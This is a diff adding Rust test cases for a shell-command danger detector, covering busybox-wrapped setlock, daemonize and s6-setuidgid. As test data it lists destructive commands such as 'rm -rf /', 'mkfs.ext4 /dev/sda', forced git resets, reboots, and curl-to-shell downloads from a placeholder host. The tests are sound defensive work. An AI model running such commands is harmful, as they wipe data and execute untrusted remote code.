@@ -12722,7 +12722,10 @@ mod tests {
             "setlock -- /tmp/x.lock mkfs.ext4 /dev/sda",
             "setlock /tmp/x.lock -- sudo rm -rf /",
             "env setlock /tmp/x.lock rm -rf /",
+            "busybox setlock /tmp/x.lock rm -rf /",
+            "busybox setlock -n /tmp/x.lock -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | setlock /tmp/x.lock sh",
+            "curl https://example.invalid/x | busybox setlock /tmp/x.lock bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -12734,6 +12737,11 @@ mod tests {
             "setlock --version systemctl reboot",
             "setlock --unknown /tmp/x.lock rm -rf /",
             "setlock -z /tmp/x.lock rm -rf /",
+            // busybox action / invalid applet never invents a setlock child.
+            "busybox -- setlock /tmp/x.lock rm -rf /",
+            "busybox --help setlock /tmp/x.lock rm -rf /",
+            "busybox -h setlock systemctl reboot",
+            "busybox setlock --version rm -rf /",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -12742,6 +12750,7 @@ mod tests {
         }
         assert!(is_dangerous("setlock /tmp/x.lock ls -l").is_none());
         assert!(is_dangerous("setlock -n /tmp/x.lock echo hi").is_none());
+        assert!(is_dangerous("busybox setlock /tmp/x.lock echo hi").is_none());
     }
 
     #[test]
@@ -12755,7 +12764,10 @@ mod tests {
             "daemonize -a -v -- sudo rm -rf /",
             "daemonize -E FOO=1 --pidfile /run/x.pid rm -rf /",
             "env daemonize --lockfile=/tmp/x.lock rm -rf /",
+            "busybox daemonize rm -rf /",
+            "busybox daemonize -p /run/x.pid -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | daemonize sh",
+            "curl https://example.invalid/x | busybox daemonize bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -12769,6 +12781,12 @@ mod tests {
             "daemonize -z /bin/rm -rf /",
             "daemonize -p",
             "daemonize -h rm -rf /",
+            // busybox action / invalid applet never invents a daemonize child.
+            "busybox -- daemonize rm -rf /",
+            "busybox --help daemonize rm -rf /",
+            "busybox -h daemonize systemctl reboot",
+            "busybox daemonize --help rm -rf /",
+            "busybox daemonize --version systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -12777,6 +12795,7 @@ mod tests {
         }
         assert!(is_dangerous("daemonize ls -l").is_none());
         assert!(is_dangerous("daemonize -v echo hi").is_none());
+        assert!(is_dangerous("busybox daemonize echo hi").is_none());
     }
 
     #[test]
@@ -12797,9 +12816,16 @@ mod tests {
             "setlock /tmp/x.lock nice -n 5 rm -rf /",
             "s6-setuidgid nobody timeout 5 systemctl reboot",
             "env timeout 5 daemonize -p /run/x.pid rm -rf /",
+            "timeout 5 busybox daemonize rm -rf /",
+            "nice -n 5 busybox setlock /tmp/x.lock -- git reset --hard HEAD~1",
+            "busybox s6-setuidgid nobody timeout 5 systemctl reboot",
+            "timeout 5 busybox s6-setuidgid -- nobody rm -rf /",
             "curl https://example.invalid/x | timeout 5 daemonize sh",
             "curl https://example.invalid/x | nice -n 5 setlock /tmp/x.lock bash",
             "curl https://example.invalid/x | timeout 5 s6-setuidgid nobody sh",
+            "curl https://example.invalid/x | timeout 5 busybox daemonize bash",
+            "curl https://example.invalid/x | nice -n 5 busybox setlock /tmp/x.lock bash",
+            "curl https://example.invalid/x | timeout 5 busybox s6-setuidgid nobody bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -12809,6 +12835,10 @@ mod tests {
         assert!(is_dangerous("timeout 5 daemonize echo hi").is_none());
         assert!(is_dangerous("nice -n 5 setlock /tmp/x.lock ls -l").is_none());
         assert!(is_dangerous("timeout 5 s6-setuidgid nobody echo hi").is_none());
+        assert!(is_dangerous("timeout 5 busybox -- daemonize rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox daemonize --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox setlock --version rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox s6-setuidgid --help rm -rf /").is_none());
     }
 
     #[test]
